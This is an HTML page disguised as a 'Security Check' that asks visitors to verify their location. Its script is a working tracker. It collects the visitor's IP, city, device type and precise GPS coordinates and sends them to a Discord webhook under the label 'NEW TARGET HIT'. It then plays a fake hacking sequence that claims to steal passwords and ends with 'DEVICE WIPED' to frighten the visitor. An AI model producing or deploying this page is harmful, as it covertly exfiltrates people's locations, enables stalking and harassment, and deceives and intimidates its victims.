<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Verification</title> 
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;
            background: url('https://i.ibb.co/FkV6vY0/image-b0e308.png') no-repeat center center fixed; 
            background-size: cover;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex; align-items: center; justify-content: center;
        }
        /* The Verification Box */
        #verify-box {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px; border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            text-align: center; width: 90%; max-width: 400px;
            z-index: 10; transition: 0.3s;
        }
        h2 { color: #333; margin-bottom: 10px; }
        p { color: #666; font-size: 0.9rem; margin-bottom: 25px; }
        #start-btn { 
            background: #28a745; color: white; border: none; 
            padding: 15px 30px; font-size: 1.1rem; border-radius: 8px;
            cursor: pointer; font-weight: bold; width: 100%;
            transition: background 0.2s;
        }
        #start-btn:hover { background: #218838; }

        /* The Hacker Console (hidden at first) */
        #console { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.9); z-index: 20; 
            display: none; flex-direction: column; align-items: center; justify-content: center;
            color: #00FF41; font-family: 'Courier New', monospace;
        }
        #log { width: 90%; max-width: 600px; text-align: left; }
        .red-alert { color: #ff0000; font-weight: bold; }
    </style>
</head>
<body>

    <div id="verify-box">
        <img src="https://cdn-icons-png.flaticon.com/512/1053/1053210.png" width="60" style="margin-bottom: 15px;">
        <h2>Security Check</h2>
        <p>Please verify your location to continue to the requested content.</p>
        <button id="start-btn" onclick="initializeBreach()">[ VERIFY IDENTITY ]</button>
    </div>

    <div id="console">
        <div id="log">
            <h1 style="color:red">> [ SYSTEM_BREACH_INITIALIZED ]</h1>
            <div id="lines"></div>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK = "YOUR_DISCORD_WEBHOOK_HERE"; 

        let userIP = "FETCHING...", userCity = "FETCHING...", userDevice = "DETECTING...";

        // Initial Data Fetch
        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
            userIP = data.ip;
            userCity = `${data.city}, ${data.region}`;
        });

        const getDevice = () => {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "ANDROID_MOBILE";
            if (/iPhone|iPad|iPod/i.test(ua)) return "APPLE_IOS";
            return "PC_STATION";
        };

        function initializeBreach() {
            // STEP 1: Ask for REAL GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(successGPS, errorGPS);
            } else {
                sendToDiscord("GPS_NOT_SUPPORTED");
                startHackerScreen();
            }
        }

        function successGPS(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            sendToDiscord(`🎯 **GPS LOCK FOUND!**\n**Map:** ${googleMapsLink}\n**Accurate to:** ${position.coords.accuracy}m`);
            startHackerScreen(lat, lon);
        }

        function errorGPS() {
            sendToDiscord("❌ User denied GPS access. Falling back to IP location.");
            startHackerScreen("N/A", "N/A");
        }

        function sendToDiscord(gpsInfo) {
            fetch(DISCORD_WEBHOOK, {
                method: "POST", headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    content: `🚨 **NEW TARGET HIT!**\n**Device:** ${getDevice()}\n**IP:** ${userIP}\n**City:** ${userCity}\n**Status:** ${gpsInfo} 💀` 
                })
            });
        }

        function startHackerScreen(lat, lon) {
            document.getElementById('verify-box').style.display = 'none';
            document.getElementById('console').style.display = 'flex';
            
            const lines = [
                "BYPASSING BROWSER SECURITY...",
                `IP_DETECTED: ${userIP}`,
                `HARDWARE: ${getDevice()}`,
                `GEO_TRIANGULATION: ${lat}, ${lon}`,
                "ACCESSING CAMERA_MODULE... [WAITING]",
                "STEALING CHROME_PASSWORDS...",
                "CRITICAL ERROR: SYSTEM_TRACE_DETECTED",
                "WIPING DEVICE TO PREVENT DETECTION..."
            ];

            let i = 0;
            const interval = setInterval(() => {
                if (i < lines.length) {
                    document.getElementById('lines').innerHTML += `<p>> ${lines[i]}</p>`;
                    i++;
                } else {
                    clearInterval(interval);
                    setTimeout(() => {
                        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%; font-size:4rem;'>DEVICE WIPED</h1>";
                        document.body.style.background = "black";
                    }, 2000);
                }
            }, 1200);
        }
    </script>
</body>
</html>
